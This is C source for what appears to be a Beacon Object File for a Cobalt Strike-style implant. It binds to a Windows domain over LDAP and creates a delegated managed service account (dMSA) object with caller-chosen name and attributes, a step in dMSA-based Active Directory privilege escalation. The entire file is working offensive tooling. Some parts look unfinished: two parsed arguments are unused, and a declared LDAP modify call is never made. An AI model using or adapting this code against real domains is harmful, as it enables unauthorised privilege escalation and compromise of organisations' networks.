#include <windows.h>
#include <winldap.h>
#include <winber.h>

#include "bofdefs.h"
#include "beacon.h"

#pragma comment(lib, "wldap32.lib")

WINLDAPAPI LDAP* LDAPAPI WLDAP32$ldap_init(PSTR HostName, ULONG PortNumber);
WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_set_option(LDAP *ld, int option, void *invalue);
WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_bind_s(LDAP *ld, PSTR dn, PSTR cred, ULONG method);
WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_add_s(LDAP *ld, PSTR dn, LDAPModA *mods[]);
WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_modify_s(LDAP *ld, PSTR dn, LDAPModA *mods[]);
WINLDAPAPI ULONG LDAPAPI WLDAP32$ldap_unbind(LDAP *ld);
WINLDAPAPI PSTR LDAPAPI WLDAP32$ldap_err2string(ULONG err);

DECLSPEC_IMPORT int MSVCRT$snprintf(char *buffer, size_t count, const char *format, ...);
DECLSPEC_IMPORT void* MSVCRT$malloc(size_t size);
DECLSPEC_IMPORT void MSVCRT$free(void *ptr);
DECLSPEC_IMPORT size_t MSVCRT$strlen(const char *str);

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    char *path = BeaconDataExtract(&parser, NULL);
    char *dMSAname = BeaconDataExtract(&parser, NULL);
    char *access = BeaconDataExtract(&parser, NULL);
    char *target = BeaconDataExtract(&parser, NULL);
    char *domain = BeaconDataExtract(&parser, NULL);

    LDAP *ld = NULL;
    int result;
    int version = LDAP_VERSION3;
    unsigned char *binary_data = NULL;
    int binary_len = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "Connecting to LDAP\n");
    ld = WLDAP32$ldap_init(domain, LDAP_PORT);
    if (ld == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "LDAP init failed\n");
        return;
    }

    result = WLDAP32$ldap_set_option(ld, LDAP_OPT_PROTOCOL_VERSION, &version);
    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Set version failed: %s\n", WLDAP32$ldap_err2string(result));
        goto cleanup;
    }

    result = WLDAP32$ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Bind failed: %s\n", WLDAP32$ldap_err2string(result));
        goto cleanup;
    }

    // Compose DN and attributes
    char childDn[512];
    char dnsHostName[512];
    char samAccountName[512];

    snprintf(childDn, sizeof(childDn), "CN=%s,%s", dMSAname, path);
    snprintf(dnsHostName, sizeof(dnsHostName), "%s.%s", dMSAname, domain);
    snprintf(samAccountName, sizeof(samAccountName), "%s$", dMSAname);

    // Set up attributes
    LDAPModA modObjectClass, modMSAState, modInterval, modDns, modSam;
    LDAPModA *mods[6];

    char *objectClassVals[] = { "msDS-DelegatedManagedServiceAccount", NULL };
    char *msaStateVals[] = { "0", NULL };
    char *intervalVals[] = { "30", NULL };
    char *dnsVals[] = { dnsHostName, NULL };
    char *samVals[] = { samAccountName, NULL };

    modObjectClass.mod_op = LDAP_MOD_ADD;
    modObjectClass.mod_type = "objectClass";
    modObjectClass.mod_values = objectClassVals;

    modMSAState.mod_op = LDAP_MOD_ADD;
    modMSAState.mod_type = "msDS-DelegatedMSAState";
    modMSAState.mod_values = msaStateVals;

    modInterval.mod_op = LDAP_MOD_ADD;
    modInterval.mod_type = "msDS-ManagedPasswordInterval";
    modInterval.mod_values = intervalVals;

    modDns.mod_op = LDAP_MOD_ADD;
    modDns.mod_type = "dNSHostName";
    modDns.mod_values = dnsVals;

    modSam.mod_op = LDAP_MOD_ADD;
    modSam.mod_type = "sAMAccountName";
    modSam.mod_values = samVals;

    mods[0] = &modObjectClass;
    mods[1] = &modMSAState;
    mods[2] = &modInterval;
    mods[3] = &modDns;
    mods[4] = &modSam;
    mods[5] = NULL;

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Attempting to add object: %s\n", childDn);

    result = WLDAP32$ldap_add_s(ld, childDn, mods);
    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to add entry: %s\n", WLDAP32$ldap_err2string(result));
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully added service account: %s\n", dMSAname);
    }

cleanup:
    if (ld != NULL) {
        WLDAP32$ldap_unbind(ld);
    }
}